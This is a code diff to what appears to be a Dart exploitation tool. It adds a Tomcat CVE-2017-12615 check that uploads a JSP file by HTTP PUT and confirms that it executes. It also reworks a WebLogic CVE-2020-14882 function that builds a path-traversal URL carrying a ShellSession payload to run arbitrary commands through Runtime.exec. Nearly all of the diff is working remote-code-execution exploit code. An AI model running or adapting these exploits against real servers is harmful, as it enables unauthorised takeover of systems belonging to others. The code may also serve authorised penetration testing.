@@ -114,6 +114,26 @@ class TomcatExpService {
 
   Future<ExpResult> check() async {
     try {
+      const probeJsp = '<% out.print("TOMCAT_JSP_54289"); %>';
+      final putJspRes = await http
+          .put(
+            Uri.parse('$_base/tomcat_check_54289.jsp/'),
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: probeJsp,
+          )
+          .timeout(timeout);
+      if (putJspRes.statusCode == 201 || putJspRes.statusCode == 204) {
+        final jspGetRes =
+            await http.get(Uri.parse('$_base/tomcat_check_54289.jsp')).timeout(timeout);
+        if (jspGetRes.body.contains('TOMCAT_JSP_54289')) {
+          return ExpResult(
+            true,
+            'CVE-2017-12615',
+            'PUT 写入 JSP 并成功执行回显，RCE 链路成立',
+          );
+        }
+      }
+
       final putRes = await http
           .put(
             Uri.parse('$_base/tomcat_put_test.txt/'),
@@ -256,9 +276,14 @@ class WebLogicExpService {
 
   Future<String?> execRceCve202014882(String cmd) async {
     try {
-      final shellCmd = Uri.encodeComponent(cmd);
+      final shellCmd = cmd
+          .replaceAll(r'\', r'\\')
+          .replaceAll("'", r"\'");
+      final handle = Uri.encodeQueryComponent(
+        'com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(\'$shellCmd\');")',
+      );
       final url =
-          '$_base/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%5C%22$shellCmd%5C%22);%22)';
+          '$_base/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=$handle';
       final res = await http.get(Uri.parse(url)).timeout(timeout);
       return res.body.isNotEmpty ? res.body : '命令已发送 (状态 ${res.statusCode})，无直接回显';
     } catch (_) {
